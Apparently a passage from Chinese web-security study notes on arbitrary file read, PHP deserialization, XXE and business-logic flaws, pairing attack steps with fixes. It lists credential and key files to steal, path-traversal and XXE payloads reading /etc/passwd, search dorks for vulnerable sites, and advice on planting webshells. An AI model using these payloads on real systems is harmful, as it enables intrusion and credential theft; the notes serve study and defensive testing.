+<h3 id="重要位置"><a href="#重要位置" class="headerlink" title="重要位置"></a>重要位置</h3><h4 id="操作系统常用函数"><a href="#操作系统常用函数" class="headerlink" title="操作系统常用函数"></a>操作系统常用函数</h4><p><strong>Windows</strong><br>C:\boot.ini //查看系统版本<br>C:\Windows\System32\inetsrv\MetaBase. xml //IIS配置文件<br>C:\Windows\repair\sam //存储系统初次安 装的密码<br> C:\Program Files\mysql\my.ini //Mysql配 置<br> C:\Program Files\mysql\data\mysql\user. MYD //Mysql root C:\Windows\php.ini //php配置信息<br> C:\Windows\my.ini //Mysql配置信息</p>
+<p><strong>linux</strong><br><code>.bash_history</code> # 历史中可能带着用户的密码 ( 遇到过现实案例,是输错的情况下参数的,比如没 输入 su 却以为自己输了 su)<br>/etc/passwd # 用户情况<br> /etc/shadow # 直接 John the Ripper<br> /etc/hosts # 主机信息，通常配置了一些内网 域名<br> /root/.bash_history //root的bash历史记录<br>  /root/.ssh/authorized_keys<br>  /root/.mysql_history //mysql的bash历史记 录<br>  /root/.wget-hsts<br>  /opt/nginx/conf/nginx.conf //nginx的配置 文件<br>  /var/www/html/index.html<br>  /etc/my.cnf<br>  /etc/httpd/conf/httpd.conf //httpd的配置 文件<br>  /proc/self/fd/fd[0-9]*(文件标识符)<br>  /proc/mounts<br>   /porc/config.gz<br>   /proc/sched_debug // 提供cpu上正在运行 的进程信息，可以获得进程的pid号，可以配合 后面需要pid的利用<br>   /proc/mounts // 挂载的文件系统列表<br>    /proc/net/arp //arp表，可以获得内网其他机 器的地址<br>     /proc/net/route //路由表信息<br>      /proc/net/tcp and /proc/net/udp // 活动 连接的信息<br>       /proc/net/fib_trie // 路由缓存<br>       /proc/version // 内核版本<br>        /proc/[PID]/cmdline // 可能包含有用的路径 信息<br>        /proc/[PID]/environ // 程序运行的环境变量 信息，可以用来包含getshell<br>        /proc/[PID]/cwd // 当前进程的工作目录<br>        /proc/[PID]/fd/[#] // 访问file descriptors， 某写情况可以读取到进程正在使用的文件，比如 access.log<br>         /root/.ssh/id_rsa<br>         /root/.ssh/id_rsa.pub<br>         /root/.ssh/authorized_keys<br>         /etc/ssh/sshd_config /var/log/secure<br>         /etc/sysconfig/network-scripts/ifcfg-eth0<br>         /etc/syscomfig/network-scripts/ifcfg-eth1<br>         /usr/local/tomcat/conf/tomcat-users. xml # tomcat 用户配置文件<br>         /root/.bashrc # 环境变量<br>          /root/.bash_history # 还有root外的其他用户<br>          /root/.viminfo # vim 信息<br>          /root/.ssh/id_rsa # 拿私钥直接ssh<br>          /proc/xxxx/cmdline # 进程状态枚举 xxxx 可 以为0000-9999 使用burpsuite 数据库 config 文件 web 日志 access.log, error.log<br>          /var/lib/php/sess_PHPSESSID # 非常规问 题 session 文件<br>          /proc/net/arp<br>          /proc/net/tcp<br>          /proc/net/udp<br>          /proc/net/dev</p>
+<h4 id="常见的网络架构"><a href="#常见的网络架构" class="headerlink" title="常见的网络架构"></a>常见的网络架构</h4><p><strong>jsp</strong><br>尝试下载tomcat-users.xml文件，里面保存了管 理Tomcat的账号密码，该文件在：Tomcat安装 目录/conf/tomcat-users.xml，下载该文件之 后，就能获取管理员账号密码，然后登陆管理后 台，部署带有木马文件的war包。</p>
+<p><strong>aspx</strong><br>aspx站点一般后台都是SQL Server数据库，因 此利用该漏洞的最简单的方法是下载网站根目录 下的web.config文件，该文件中一般含有数据库 的用户名和密码。</p>
+<p><strong>asp</strong><br>一般的asp站点都是Access数据库，而Access 数据库可以直接下载，因此利用该漏洞比较简便 的方法就是直接下载Access数据库，找到管理员 密码登陆后台，利用后台的上传功能，上传 shell。首先目的是找到数据库文件名以及存放的 路径。找到网站与数据库操作的动态页面，动态 页面中一般使用include包含连接数据库的配置 文件。一般网站的管理后台页面会包含这个信 息，所以可以使用任意文件下载漏洞下载管理后 台页面，例如admin.asp/mamage.asp等。在 这些文件中一般会写有数据库文件的路径以及文 件名。直接下载数据库文件可能下载不了，因为 管理员一般会做限制，禁止直接下载mdb文件， 可以使用任意文件下载漏洞来下载数据库文件。</p>
+<p><strong>php</strong><br>php一般是使用MySQL数据库， 一般MySQL数 据库禁止远程连接，但是可以使用phpMyAdmin 进行管理。同意，尝试下载数据库连接文件， conf/config.php等等，获取数据库账户密码之 后，如果是root权限，在知道网站绝对路径的情 况下，尝试直接写入一句话木马。</p>
+<h3 id="与文件包含的区别"><a href="#与文件包含的区别" class="headerlink" title="与文件包含的区别"></a>与文件包含的区别</h3><p><code>index.php?f=../../../../../../etc/passwd</code><br> <code>index.php?f=../index.php</code><br> <code>index.php?f=file:///etc/passwd</code><br> 注：当参数f的参数值为php文件时，若是文件被 解析则是文件包含漏洞，若显示源码或提示下载 则是文件查看与下载漏洞</p>
+<h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><p><code>inurl:&quot;readfile.php?file=&quot;</code><br><code>inurl:&quot;download.php?file=&quot;</code><br><code>inurl:&quot;read.php?filename=&quot;</code><br><code>inurl:&quot;down.php?file=&quot;</code></p>
+<h3 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h3><p><strong>主题思路</strong><br>尝试读取敏感文件以获取尽可能多的信息。 例如， /etc/issue 可以确认 Linux 主机的发行 版。其中 .bash_history, ssh相关路径 中可能含有大 量敏感信息。 获取到 /etc/shadow 则可以直接使用 John The Ripper 尝试枚举 root 密码。 比如Tomcat 控制台可读取用户密码 /usr/ local/tomcat/conf/tomcat-users.xml。</p>
+<p><strong>思路</strong></p>
+<ol>
+<li>一定要确认是否具有root权限，这个很重要， 不然很多文件还是因为权限问题没法被读取，/ root/目录下的都没法读取 </li>
+<li>要是没遇到root权限的漏洞，也不用直接放 弃，可以换用其他姿势，选用代码审计的方法， 主要查看数据库的配置文件 </li>
+<li>找到数据库的配置文件后如果是mysql，配置 的是localhost，那可以查看是否含有 phpmyadmin软件，要是没有推荐继续代码审 计，可能会比较耗时间，不过肯定会有所收获。 </li>
+<li>配合burp使用效果与效率最高。</li>
+</ol>
+<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>任意文件读取的漏洞非常的常见，这里典型的有 PHPCMSV9.6.1任意文件读取漏洞，FFmpeg &lt; 3.3.2，GitLab 任意文件读取漏洞 (CVE-2016- 9086)，应用服务器glassfish任意文件读取漏 洞。</p>
+<p>这里有文章分析PHPcmsV9.6.1任意文件读 取漏洞，有兴趣的可以移步链接：<a href="http://blog.nsfocus.net/phpcms-v9-6-1-arbitrary-file-download-vulnerability-analysis-exp/" target="_blank" rel="noopener">http://blog.nsfocus.net/phpcms-v9-6-1-arbitrary-file-download-vulnerability-analysis-exp/</a> 里面有 非常详细的漏洞原理，分析，利用和修复过程。<br>分享几个在实际项目中遇到的任意文件读 取漏洞的案例： </p>
+<ul>
+<li>某app应用文件读取漏洞： GET /mstep/stream.do?act=localFile&amp; filename=../../../../../../../../../../../../../../../.. /../etc/passwd </li>
+<li>某系统产品编辑处任意文件读取漏洞 GET/adm/product2/page/underdined/ getpictureAction? picturename=../../../../../../../etc/passwd </li>
+<li>文件下载处任意文件下载漏洞： down?attachId=Fil&amp;fileName=/etc/shadow </li>
+<li>目录穿越任意文件读取漏洞： /file/download.do? filePath=../../../../../../../../etc/passwd /file/download.do? filePath=../../../../../../../../data/mysql/ data/mysql.dat </li>
+<li>根目录直接读取任意文件漏洞： GET /../../../../etc/passwd GET / static/../../../../etc/passwd </li>
+<li>中间件配置错误任意文件读取漏洞： GET /static../etc/passwd</li>
+</ul>
+<h2 id="防御-7"><a href="#防御-7" class="headerlink" title="防御"></a>防御</h2><ol>
+<li>php.ini 配置 open_basedir </li>
+<li>用户输入配置白名单 </li>
+<li>不允许包含 ../<h1 id="发序列化漏洞"><a href="#发序列化漏洞" class="headerlink" title="发序列化漏洞"></a>发序列化漏洞</h1><h2 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h2></li>
+</ol>
+<p><strong>PHP序列化与反序列化介绍</strong><br>维基百科中这样定义：序列化（serialization） 在计算机科学的数据处理中，是指将数据结构或 对象状态转换成可取用格式（例如存成文件，存 于缓冲，或经由网络中发送），以留待后续在相 同或另一台计算机环境中，能恢复原先状态的过 程。</p>
+<p>概念很容易理解，其实就是将数据转化成一种可 逆的数据结构，自然，逆向的过程就叫做反序列 化。</p>
+<p>序列化的目的是方便数据的传输和存储。 在PHP应用中，序列化和反序列化一般用做缓 存，比如session缓存，cookie等。<br>常见的序列化格式：<br> xml字符串<br>  json字符串<br>  字节数组<br>  二进制格式</p>
+<p>PHP序列化与反序列化 PHP通过string serialize ( mixed $value )和 mixed unserialize ( string $str )两个函数实现序 列化和反序列化。</p>
+<p><strong>PHP反序列化漏洞</strong><br>PHP反序列化漏洞又称PHP对象注入，是因为程 序对输入数据处理不当导致的。</p>
+<p> 未对用户输入的序列化字符串进行检测，导致攻 击者可以控制反序列化过程，从而导致代码执 行，SQL注入，目录遍历等不可控后果。</p>
+<p> 在反序列化的过程中自动触发了某些魔术方法。</p>
+<p> 漏洞触发条件：unserialize函数的变量可控， php文件中存在可利用的类，类中有魔术方法</p>
+<p><strong>原理总结</strong><br>php程序为了保存和转储对象，提供了序列化的 方法，php序列化是为了在程序运行的过程中对 对象进行转储而产生的。序列化可以将对象转换 成字符串，但仅保留对象里的成员变量，不保留 函数方法。</p>
+<p>php序列化的函数为serialize。反序列化的函数 为unserialize。</p>
+<h2 id="攻击-7"><a href="#攻击-7" class="headerlink" title="攻击"></a>攻击</h2><p><strong>下面是比较典型的PHP反序列化漏洞中可能会用 到的魔术方法：</strong><br><code>void __wakeup ( void )</code><br> unserialize( )会检查是否存在一个_wakeup( ) 方 法。如果存在，则会先调用_wakeup 方法，预 先准备对象需要的资源。</p>
+<p><code>void __construct ([ mixed $args [, $... ]])</code><br> 具有构造函数的类会在每次创建新对象时先调用 此方法。</p>
+<p><code>void __destruct ( void )</code><br>析构函数会在到某个对象的所有引用都被删除或 者当对象被显式销毁时执行。</p>
+<p><code>public string __toString ( void ) __toString( )</code><br>方法用于一个类被当成字符串时应 怎样回应。例如 echo $obj;应该显示些什么。<br> 此方法必须返回一个字符串，否则将发出一条 E_ RECOVERABLE_ERROR 级别的致命错误。</p>
+<p><strong>利用方式</strong><br>PHP类中有一种特殊函数体的存在叫魔法函数， magic函数命名是以符号<strong>开头的，比如 __ construct, __destruct, __toString, __sleep, __ wakeup等等。这些函数在某些情况下会自动调 用，比如</strong>construct当一个对象创建时被调 用，<strong>destruct当一个对象销毁时被调用，</strong> toString当一个对象被当作一个字符串使用。而 在反序列化时，如果反序列化对象中存在魔法函 数，使用unserialize()函数同时也会触发。这 样，一旦我们能够控制unserialize()入口，那么 就可能引发对象注入漏洞。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123; <span class="keyword">var</span> $test = <span class="string">"demo"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt; test;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'test'</span>];</span><br><span class="line">$a_unser = unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>比如上述代码，构造payload为<code>http://127.0.0.1:800/test.php?test=O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:5:&quot; hello&quot;;}</code><br>反序列化后在脚本运行结束时就会调用_ destruct函数，同时会覆盖test变量输出hello。 我们可以利用该漏洞点，控制输入变量，拼接成 一个序列化对象。然后再构造一个魔法函数</p>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h2><p><strong>XML注入</strong><br>一个有效的 XML 文档之所以有效，是因为它遵 循了 XML 的通用规则，并且它匹配了它的文档 类型定义（DTD全称 document type definition）。<br>XML DTD就像是所使用的标签的定义文档，并且 由 XML 设计者或作者开发。DTD 定义了存在什 么标签，它们拥有什么属性，以及其它元素里面 有什么元素等等。</p>
+<p><strong>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，当允许引用外部实体时，通 过构造恶意内容，就可能导致任意文件读取、系 统命令执行、内网端口探测、攻击内网网站等危 害。（从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入 的XML数据时，解析了攻击者伪造的外部实体而 产生的。）</strong></p>
+<p><strong>就是没有规范化外部实体，导致外部实体可以执 行任意恶意代码</strong></p>
+<h2 id="攻击-8"><a href="#攻击-8" class="headerlink" title="攻击"></a>攻击</h2><p>抓包观察，查看到xml实体，可以尝试注入</p>
+<p>利用各种伪协议</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version = <span class="string">"1.0"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE note [ &lt;!ENTITY xxe SYSTEM <span class="string">"file:///etc/ passwd"</span>&gt; ]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>注意的地方</strong><br>值得注意的是,在PHP里面解析xml用的是 libxml，其在 ≥2.9.0 的版本中，默认是禁止解析 xml外部实体内容的。所以就不存在xxe漏洞</p>
+<h2 id="防御-8"><a href="#防御-8" class="headerlink" title="防御"></a>防御</h2><ul>
+<li>禁止使用外部实体，例如，如果你当前使用的程 序为PHP，则可以将libxml_disable_entity_ loader设置为TRUE来禁用外部实体，从而起到 防御的目的。</li>
+<li>过滤用户提交的XML数据，防止出现非法内容</li>
+<li>配置XML处理器去使用本地静态的DTD，不允许 XML中含有任何自己声明的DTD。（根据实际情 况）</li>
+</ul>
+<p><strong>补充</strong><br>理论上的防御措施</p>
+<ul>
+<li>禁用外部实体 </li>
+<li>过滤和验证用户提交的xml数据 </li>
+<li>不允许xml中含有任何自己声明的dtd</li>
+</ul>
+<p>实践有效的防御措施</p>
+<ul>
+<li>配置xml parser只能使用静态dtd，禁止外来引 入<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h2 id="原理-11"><a href="#原理-11" class="headerlink" title="原理"></a>原理</h2></li>
+</ul>
+<p><strong>之所以称为逻辑漏洞，是因为代码之后是人的逻 辑，人更容易犯错，是编写完程序后随着人的思 维逻辑产生的不足。sql注入、xss等漏洞可以通 过安全框架等避免，这种攻击流量非法，对原始 程序进行了破坏，防火墙可以检测，而逻辑漏洞 是通过合法合理的方式达到破坏，比如密码找回 由于程序设计不足，会产生很多问题，破坏方式 并非向程序添加破坏内容，而是利用固有不足。 这样并不影响程序运行，在逻辑上是顺利执行 的。这种漏洞一般的防护手段或设备无法阻止， 因为走的都是合法流量。也没有防护标准。</strong></p>
+<h2 id="攻击及防御"><a href="#攻击及防御" class="headerlink" title="攻击及防御"></a>攻击及防御</h2><h3 id="登陆认证模块测试"><a href="#登陆认证模块测试" class="headerlink" title="登陆认证模块测试"></a>登陆认证模块测试</h3><p><strong>1、暴力破解</strong><br>在无验证码和无限制次数的时候可以尝试<br> 修复建议 ：<br> 增加验证码 失败一次 变换一次<br>  限制登录次数<br><strong>2、本地加密传输测试</strong><br>测试验证客户端与服务器交互数据在网络传输过 程中是否采用ssl进行加密处理，加密数据是否可 被破解<br>使用wireshark网络抓包工具 选择与公网连接的 本地网卡并开启对网卡流量数据的捕获功能 对有https进行流量监控 把登陆请求得数据包进 行分析 看看是否能看到密码<br> 修复建议 ：<br> 在架设web应用的服务器上部署有效的ssl证书服 务</p>
+<p><strong>3、session测试</strong></p>
+<ul>
+<li>session是应用系统对浏览器客户端身份认证的 标识 在用户退出应用系统时 应将客户端session 认证属性标签清空 如果未清空 攻击者可利用该 漏洞生产固定的session会话 并诱骗用户利用攻 击者生成的固定会话进行登陆 从而导致会话认证 被窃取<br>测试方法 ：<br>在退出系统时进行抓包 记录sessionid值进行记 录 在登陆系统时在抓包 比较上次的值 看是否一 致<ul>
+<li>session会话注销测试<br>测试方法 ：<br>先抓包用户注销时的包 记录值 退出后 利用值登 陆 看是否能登上去 能登陆上说明存在漏洞哦 </li>
+<li>session会话超时时间测试<br>主要看服务器在用户没操作的情况下有没销毁用 户的session值 要求用户重新登陆<br>测试方法：<br>对登陆的用户进行抓包 获得值 然后过30分钟后 利用这个值看是否能登陆</li>
+</ul>
+</li>
+</ul>
+<p><strong>4、cookie仿冒测试</strong><br>Cookie是用户身份信息存储的一个东西 测试方法 注册两个账号 抓取两个个账号的cookie值 利用 另外一个账号的值看能否登陆另外一个账号 修复建议 对客户端标识的用户敏感信息数据 使用session 会话认证方式 避免被他人利用</p>
+<p><strong>5、密文对比认证测试</strong><br>在系统登陆时密码加密流程是将用户名和密码交 给服务器后 服务器把密码经过hash算法加密后 和数据库中的加密值进行对比 如果相同 则正确 但有些网站则是在前台客户端加密在进行传输 这 样就会出现一个问题可以爆破 测试方法 在登陆时抓包 使用payload processing add hash hd5进行爆破解密</p>
+<p><strong>6、登陆失败信息测试</strong><br>在登陆失败时可能会提示你账号不存在或则密码 错误 通过这个可以判断是否存在这个账号</p>
+<h3 id="业务办理模块测试"><a href="#业务办理模块测试" class="headerlink" title="业务办理模块测试"></a>业务办理模块测试</h3><p><strong>1、订单id篡改测试</strong><br>在电子交易网站中 用户可下单购买产品 购买成 功后可查看订单 当开发人员没有考虑用户间权限 隔离就容易造成平行越权获取其他用户的购买信 息</p>
+<ul>
+<li>测试方法：<br>注册一个账号 然后篡改 遍历订单id 获取其他用 户订单详情<br>登录A账号查看个人单号 抓包修改单号 查看是否 能越权查看他人订单内容 注意看返回包看是否有 敏感数据</li>
+<li>修复建议：<br>查看订单通过session机制判断身份 查看单号判 断是否和登陆者一致</li>
+</ul>
+<p><strong>2、手机号篡改</strong><br>当请求中发现有手机号参数时 可以修改尝试</p>
+<ul>
+<li><p>测试方法：<br>当A用户登录后 尝试某个功能 抓包 修改成其他手 机号 看是否能执行成功 </p>
+<ul>
+<li>修复建议：<br>后台请求要通过session机制判断用户身份</li>
+</ul>
+<p><strong>3、用户id篡改</strong><br>用户登录后应通过session判断用户身份才能显 示个人信息 但通过抓包请求后有userid这类参 数时 尝试修改这个id</p>
+<ul>
+<li>测试方法 ：<br>注册一个ID 在修改收货人信息等功能处修改ID看 能否执行成功此操作</li>
+<li>修复建议 ：<br>后台请求要通过session机制判断用户身份 服务 器效验userID</li>
+</ul>
+</li>
+</ul>
+<p><strong>4、邮箱和用户篡改</strong><br>在发现有发送邮件或站内信息时 篡改发件人参 数 可能可以伪造发信人进行钓鱼 也是平行越权</p>
+<ul>
+<li>测试方法 ：<br>攻击者在发送邮件等信息时 篡改发件人参数 如 inputfrom等参数 如果发送成功 则证明有 也可以注册几个账号试一下</li>
+<li>修复建议 ：<br>发送信息要通过session机制判断用户身份 查看 发件人是否和登陆者身份一致</li>
+</ul>
+<p><strong>5、商品编号篡改</strong><br>在交易页面时 可以尝试修改金额 篡改金额 篡改 编号 同样会造成实际支付金额与商品不对应 但 又交易成功的情况 实现低价买高价的物品</p>
+<ul>
+<li>测试方法：<br>在提交订单时 抓包篡改商品编号 导致商品与价 格不对应但又交易成功 留意gooid id等参数<ul>
+<li>修复建议 ：<br>建议商品金额不要在客户端传入 防止被篡改</li>
+</ul>
+</li>
+</ul>
+<p><strong>6、竞争条件</strong><br>原理当两个或多个线程试图在同一时刻访问一个 进程 可能会导致服务器略过 造成多次交易</p>
+<ul>
+<li>攻击者在提交订单时抓包 设置多个线程重放此 包 在众多请求中 个别请求就有可能争取绕过金 额 次数的判断 交易成功</li>
+<li>修复建议 ：<br>在处理订单时 使用acid特性 并避免数据脏读。<h3 id="业务授权访问模块"><a href="#业务授权访问模块" class="headerlink" title="业务授权访问模块"></a>业务授权访问模块</h3><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4>指用户在没有通过认证授权的情况下能够直接访 问需要通过认证才能访问到的页面</li>
+<li>测试方法 ：<br>可以在登录某网站前台或者后台之后 想URL复 制 打开其他浏览器看能否访问 </li>
+<li>修复建议 ：</li>
+<li>对未授权访问页面做session认证 并对每一个 URL做身份鉴别 正确效验用户ID和token等</li>
+</ul>
+<h4 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h4><p><strong>平行</strong><br>水平越权 查看是否有参数可以遍历<br>常见出现位置 </p>
+<ol>
+<li>下单成功后的订单查看出 </li>
+<li>收货地址 删除和添加 </li>
+<li>下单时候的地址修改</li>
+</ol>
+<p>条件</p>
+<ol>
+<li>直接对象应用<br>出现在URL后加上自己ID就可查看 当修改他人的 ID号会返回他人的信息 </li>
+<li>多阶段功能<br>修改密码 可能第一步是验证用户身份信息 号码 验证码类的 当验证成功后 输入新密码 很多程序 在这一步不在验证用户身份 导致可以珠宝修改数 值 导致可修改任意用户密码</li>
+</ol>
+<p><strong>垂直</strong><br>登录用户A看能否把身份改成高权限的C账户<br>可以尝试修改管理员密码<br>修复建议：<br> 服务端效验身份唯一性 自己的身份只能查看 修 改 删除 添加自己的信息</p>
+<h3 id="输入、输出模块测试-登录框"><a href="#输入、输出模块测试-登录框" class="headerlink" title="输入、输出模块测试  登录框"></a>输入、输出模块测试  登录框</h3><p><strong>Sql注入测试</strong><br> 数字型<br> 字符型<br> 修复建议 ：<br> 对参数进行检查 过滤特殊字符或进行转义<br> <strong>Xss测试</strong><br> 反射型<br> 存储型<br> 修复建议 ：<br> 过滤特殊字符<br>  <strong>命令执行</strong><br>  未对register_key参数进行过滤<br>   修复建议：<br>    尽量少用执行命令的函数或者直接禁用 参数值使 用引号包括在使用动态函数之前 确保使用的函数 是指定的函数之一 进入执行命令的函数之前 对 参数进行过滤 对敏感字符进行转义</p>
+<h3 id="回退模块测试"><a href="#回退模块测试" class="headerlink" title="回退模块测试"></a>回退模块测试</h3><p>在web业务在密码修改成功后或者订单付款成功 后等业务模块 在返回上一步从新修改密码或者重 新付款时存在重新设置密码或付款的功能 如果能 返回上一步操作 存在回退漏洞<br>修复建议<br>首先判断该步骤的请求是否是上一步骤的业务所 发起的 如果不是返回错误提示 或页面失效</p>
+<h3 id="验证码机制测试"><a href="#验证码机制测试" class="headerlink" title="验证码机制测试"></a>验证码机制测试</h3><p><strong>验证码暴力破解</strong><br>验证码主要被用于防止暴力破解 防止DDOS 识别 用户身份等 验证码主要由4-6个数字组成</p>
+<ul>
+<li>测试过程<br>攻击者填写手机号注册 发送验证码 设置验证码 范围00000-99999 或者0000-9999进行暴力破 解 通过返回值判断是否登录成功 <ul>
+<li>修复建议:<br>设置验证码失效时间 限制验证码失败尝试次数 若失败五次则锁定用户</li>
+</ul>
+</li>
+</ul>
+<p><strong>验证码重复使用</strong><br>在网站登录或评论等页面 如果验证码认证成功后 没将session及时清空 导致验证码成功后可重复 利用 测试时抓取携带验证码的数据包重复提交 看是否成功</p>
+<ul>
+<li>测试过程<br>攻击者填写投诉建议 输入页面验证码 抓包 重复 提交 看是否成功提交了多个投诉信息 </li>
+<li>修复建议 ：<br>验证码在一次认证成功后 服务端清空认证成功的 session 这样就可以有效防止验证码一次认证反 复使用的问题</li>
+</ul>
+<p><strong>验证码客户端回显</strong><br>有些网站验证码可能在客户端生成 F12查看返回 包是否存在</p>
+<ul>
+<li>测试流程<br>进入找回页面 输入手机号等 获取验证码 f12查看 返回包是否存在验证码 在network response下 </li>
+<li>修复建议 ：<br>禁止验证码在客户端生成 设置验证码时效性 180s过期 设置随机性 一次失效</li>
+</ul>
+<p><strong>验证码绕过</strong><br>通过修改前端提交服务器返回的数据 可以实现绕 过验证码</p>
+<ul>
+<li>测试过程<br>攻击者进入注册账号页面 输入手机号 获取验证 码 填写任意验证码 抓包 右击选择intercept response tro this request 单击faorword后 就 能查看并修改返回包信息 转发数据包 查看是否 注册成功</li>
+<li>修复建议 ：<br>在服务端增加验证码的认证机制 对客户端提交的 验证码进行二次效验</li>
+</ul>
+<p><strong>验证码自动识别</strong><br>验证码识别技术<br>图像二值化就是讲像素点的灰度值设置为0或 255 讲图像呈黑白效果 通常加一些线 点 色彩进 行干扰</p>
+<h3 id="业务数据安全测试"><a href="#业务数据安全测试" class="headerlink" title="业务数据安全测试"></a>业务数据安全测试</h3><p><strong>商品支付金额篡改</strong><br>电商类网站在业务流程整个环节 需要对业务数据 的完整性和一致性进行保护 通常在订购类交易 中 容易出现服务端未对用户提交的业务数据进行 强制效验 过度信赖客户端的数据而导致商品金额 篡改漏洞</p>
+<ul>
+<li>测试过程<br>在购买时进行抓包 查看是否有数据 修改为1 看是 否能支付成功<ul>
+<li>修复建议 ：<br>商品信息如金额折扣等原始数据的效验应来自于 服务器端 不应该接受客户端传递过来的值</li>
+</ul>
+</li>
+</ul>
+<p><strong>商品订单数量篡改</strong><br>通过在业务流程中抓包修改订购商品数量等字段 修改成1和负数 看业务系统能否以修改后的数量 完成业务流程</p>
+<ul>
+<li>测试方法<br>主要针对商品订购的过程中对异常交易数据处理 缺乏风控机制而导致的相关业务逻辑漏洞 在结算处抓包修改数量参数为负数 放过 看是否 能完成操作<ul>
+<li>修复建议<br>对产生异常情况的交易行为 应当限制 阻断 而非 继续完成整个交易流程</li>
+</ul>
+</li>
+</ul>
+<p><strong>商品订单编号篡改</strong><br>商品订单编号篡改测试 注意编号购买的时候抓包改成其他商品的编号 看 是否能低价买高价商品 商品支付状态 看返回包 0 改1 false改true 商品优惠券！！！！！！！！！！ 测试是否能一直领或者修改优惠金额数量等等等</p>
+<p><strong>前端js限制绕过测试</strong><br>在购买数量时 服务器尽在页面通过js脚本限制</p>
+<ul>
+<li>测试流程<br>在购买时 未对数量进行前后端严格效验 在限制购买数量的页面 提交 抓包 修改数量看是 否能完成 </li>
+<li>修复建议 ：<br>商品信息如金额折扣等原始数据的效验应来自于 服务器端 不应该接受客户端传递过来的值</li>
+</ul>
+<p><strong>请求重放</strong><br>设置缺陷 在购买成功后 参照正常流程 进行重放操作 可以 实现一次购买多次收获等违背正常业务逻辑的结 果</p>
+<ul>
+<li>测试方法<br>在生成订单流程时抓取订购请求 观察每次订购 相同商品的请求是否存在不同随机token 可变参 数等 尝试重放之前已经完成流程的订购请求 观 察服务端是否做出正确反应<ul>
+<li>修复建议：<br>用户每一次订单token不能重复提交 避免重放</li>
+</ul>
+</li>
+</ul>
+<p><strong>业务上限测试</strong><br>针对在业务办理流程中 服务端没对用户提交的查 询范围 订单数量 金额等数据进行严格效验而引 发的逻辑漏洞</p>
+<ul>
+<li>测试过程<br>在业务查询 受理记录查询中 看有无年月 看能否 查看更久之前的操作记录 </li>
+<li>修复建议：<br>服务端应该对订单token对应的订购信息内容 用 户身份 用户可用积分等进行强效验。<h3 id="业务流程乱序测试"><a href="#业务流程乱序测试" class="headerlink" title="业务流程乱序测试"></a>业务流程乱序测试</h3></li>
+</ul>
+<p><strong>测试原理</strong><br>主要针对业务流程的处理流程是否正常 例如业务 流程分三步 注册并发送验证码 输入验证码 注册 成功 在第三步抓包分析 将邮箱手机号等信息替 换看是否成功</p>
+<ul>
+<li>测试过程<br>正常注册充值金额 充值金额抓包 查看订单号等 信息 丢包 构建链接 =刚刚充值的订单号 看是否成 功</li>
+<li>修复建议 ：<br>对敏感信息如身份id 账号密码 订单号 金额 进行 加密处理 并在服务端对其进行二次比对<h3 id="密码找回模块测试"><a href="#密码找回模块测试" class="headerlink" title="密码找回模块测试"></a>密码找回模块测试</h3></li>
+</ul>
+<p><strong>验证码客户端回显</strong><br>有些网站会选择将验证码回显在响应中 来判断用 户输入的验证码是否和响应中的一致</p>
+<ul>
+<li>测试流程<br>填入要找回的账号 通过抓包 看返回包找验证码 如果有验证码 就可以绕过验证机制修改密码 达 到任意修改 </li>
+<li>修复建议<br>避免验证码返回到响应包中 放在服务端验证</li>
+</ul>
+<p><strong>验证码暴力破解</strong><br>一般4到6位验证码可以爆破</p>
+<ul>
+<li>测试流程<br>随便填个验证码 进行抓包 生成字典进行枚举 </li>
+<li>修复建议：<br>加入验证码 采取错误次数限制 提高验证码复杂 度</li>
+</ul>
+<p><strong>接口参数账号修改</strong><br>服务端没对账号绑定的邮箱进行验证</p>
+<ul>
+<li>测试流程<br>在找回密码中抓包 看email修改成自己的 看是否 能收到邮件 </li>
+<li>修复建议：<br>对找回密码的token做效验 一个token智能修改 一个用户 保证token不泄露</li>
+</ul>
+<p><strong>response状态值修改</strong><br>修改请求的响应结果来重置密码 欺骗客户端</p>
+<ul>
+<li>测试流程<br>找回密码 抓包右击intercept 选择do intercept response to this request 设置后就能看到请求 的回显response包 看有没1 0 true false等关键 字并修改 <ul>
+<li>修复建议 ：<br>不要在前端利用服务端返回的值判断是否可以修 改密码 要把整个效验环节交给服务端</li>
+</ul>
+</li>
+</ul>
+<p><strong>session覆盖</strong><br>通过session判断</p>
+<ul>
+<li>测试步骤<br>在找回密码中设置成自己的手机号 找 到攻击者的手机号 进行下一步 在第一个页面刷 新 看能否重置攻击者的手机号密码 </li>
+<li>修复建议：<br>在重置密码中一定要对修改的账号和凭证是否一 致做进一步的效验</li>
+</ul>
+<p><strong>弱token设计缺陷测试</strong><br>Token可能由当前的年月日时间定 弱token可能 将用户的UID加密成MD5或者base64 多看几次 找规律</p>
+<ul>
+<li>测试流程<br>在接受凭证找回密码中 发送多分邮箱验证 看url 的变化值 可能通过base64加密 可能可以暴力猜 解 找到密码的凭证 <ul>
+<li>修复建议 ：<br>密码找回的token设置的复杂点</li>
+</ul>
+</li>
+</ul>
